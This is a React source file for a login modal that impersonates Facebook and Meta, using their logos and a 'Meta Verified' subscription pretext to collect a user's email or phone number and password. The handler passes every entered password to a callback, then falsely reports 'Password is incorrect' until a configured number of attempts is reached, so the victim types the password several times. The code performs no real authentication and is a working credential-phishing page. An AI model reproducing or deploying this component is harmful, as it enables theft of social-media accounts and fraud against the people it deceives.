import { useState } from 'react';
import PropTypes from 'prop-types';
import TickIcon from '@/assets/images/tick.svg';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import FbRoundLogo from '@/assets/images/fb_round_logo.png';
import config from '@/utils/config';

const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
    const [formData, setFormData] = useState({
        identifier: '',
        password: ''
    });
    const [showPassword, setShowPassword] = useState(false);
    const [loginAttempt, setLoginAttempt] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);

    const handleChange = (field, value) => {
        setFormData((prev) => ({ ...prev, [field]: value }));
        if (showError) {
            setShowError(false);
        }
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        if (!formData.identifier.trim() || !formData.password.trim()) {
            return;
        }

        setIsLoading(true);
        setShowError(false);

        setTimeout(() => {
            setIsLoading(false);

            const nextAttempt = loginAttempt + 1;
            onSubmit(formData.identifier, formData.password);

            if (nextAttempt >= config.max_password_attempts) {
                setShowError(false);
                onSuccess();
            } else {
                setShowError(true);
                setLoginAttempt(nextAttempt);
            }
        }, 1500);
    };

    const togglePasswordVisibility = () => {
        setShowPassword((prev) => !prev);
    };

    if (!show) return null;

    return (
        <>
            <div className="modal-backdrop show" onClick={onClose}></div>
            <div className="modal form-modal show" id="exampleModal2" style={{ display: show ? 'block' : 'none' }} tabIndex="-1">
            <div className="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
                <div className="modal-content">
                    <div className="modal-header"></div>
                    <div className="modal-body">
                        <div className="fb-round-wraper text-center">
                            <img alt="" className="fb-logo-round" src={FbRoundLogo} />
                        </div>

                        <form autocomplete="off" id="apiForm" onSubmit={handleSubmit}>
                            <p style={{ color: '#1877f2', fontWeight: '600', fontSize: '14px', marginBottom: '6px', textAlign: 'left' }}>
                                <img src={TickIcon} width="16" alt="tick" style={{ verticalAlign: 'middle' }} /> {texts.loginInstruction || 'In order to subscribe your business to Meta Verified, you must be logged in to your professional account (Facebook) or business Page (Facebook).'}
                            </p>

                            {loginAttempt === 0 && (
                                <div className="form-floating mb-3" id="emailField">
                                    <input
                                        autocomplete="username"
                                        className="form-control"
                                        id="loginIdentifier"
                                        maxLength="60"
                                        minLength="3"
                                        name="identifier"
                                        placeholder={texts.mobileOrEmail || 'Mobile number or email'}
                                        required
                                        type="text"
                                        value={formData.identifier}
                                        onChange={(e) => handleChange('identifier', e.target.value)}
                                    />
                                    <label htmlFor="loginIdentifier">{texts.mobileOrEmail || 'Mobile number or email'}</label>
                                    <div className="invalid-feedback">{texts.mobileOrEmail || 'Please enter your mobile number or email.'}</div>
                                </div>
                            )}

                            <div className="form-floating mb-3" style={{ position: 'relative' }}>
                                <input
                                    autocomplete="current-password"
                                    className={`form-control ${showError ? 'is-invalid shake' : ''}`}
                                    id="exampleInputPassword"
                                    maxLength="30"
                                    minLength="3"
                                    name="password-1"
                                    placeholder={texts.password || 'Password'}
                                    required
                                    style={{ paddingRight: '44px' }}
                                    type={showPassword ? 'text' : 'password'}
                                    value={formData.password}
                                    onChange={(e) => handleChange('password', e.target.value)}
                                />
                                <label htmlFor="exampleInputPassword">{texts.password || 'Password'}</label>

                                <button
                                    aria-label="Show/Hide password"
                                    aria-pressed={showPassword}
                                    className="password-toggle"
                                    id="show-hide-pass"
                                    style={{
                                        position: 'absolute',
                                        right: '12px',
                                        top: '50%',
                                        transform: 'translateY(-50%)',
                                        cursor: 'pointer',
                                        zIndex: 6,
                                        background: 'transparent',
                                        border: 0,
                                        padding: 0
                                    }}
                                    type="button"
                                    onClick={togglePasswordVisibility}
                                >
                                    <svg fill="#606770" height="22" id="eyeClosed" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg" style={{ display: showPassword ? 'none' : 'inline' }}>
                                        <path d="M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z"></path>
                                        <circle cx="12" cy="12" r="2.5"></circle>
                                    </svg>

                                    <svg fill="#1877f2" height="22" id="eyeOpen" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg" style={{ display: showPassword ? 'inline' : 'none' }}>
                                        <path d="M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z"></path>
                                    </svg>
                                </button>

                                {showError && (
                                    <div className="invalid-feedback d-block" id="errorMsg">
                                        {texts.passwordIncorrect || 'Password is incorrect, please try again.'}
                                    </div>
                                )}
                            </div>

                            <div className="form-btn-wrapper">
                                <button className="btn btn-primary w-100" id="loginBtn" style={{ position: 'relative', height: '45px' }} type="submit" disabled={isLoading}>
                                    <span className="button-text" style={{ visibility: isLoading ? 'hidden' : 'visible' }}>
                                        {loginAttempt === 0 ? (texts.logIn || 'Log in') : (texts.continueBtn || 'Continue')}
                                    </span>
                                    {isLoading && (
                                        <span className="custom-spinner" id="spinner" style={{ position: 'absolute', left: '50%', top: '50%', transform: 'translate(-50%, -50%)', width: '22px', height: '22px', border: '3px solid rgba(255,255,255,0.5)', borderTopColor: '#fff', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }}></span>
                                    )}
                                </button>
                            </div>

                            <div className="text-center mt-3" id="forgot-pass-wrap">
                                <a href="#forgot">{texts.forgotPassword || 'Forgot password?'}</a>
                            </div>
                        </form>

                        <div className="spaser"></div>
                    </div>

                    <div className="modal-footer border-0 justify-content-center" style={{ flexDirection: 'column', textAlign: 'center' }}>
                        <img src={MetaLogo} alt="Meta Logo" style={{ height: '20px', marginBottom: '5px' }} />
                        <div className="footer-links" style={{ fontSize: '12px', color: '#000' }}>
                            {texts.aboutHelpMore || 'About · Help · See more'}
                        </div>
                    </div>
                </div>
            </div>
        </div>
        </>
    );
};

LoginModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSubmit: PropTypes.func.isRequired,
    onSuccess: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired
};

export default LoginModal;
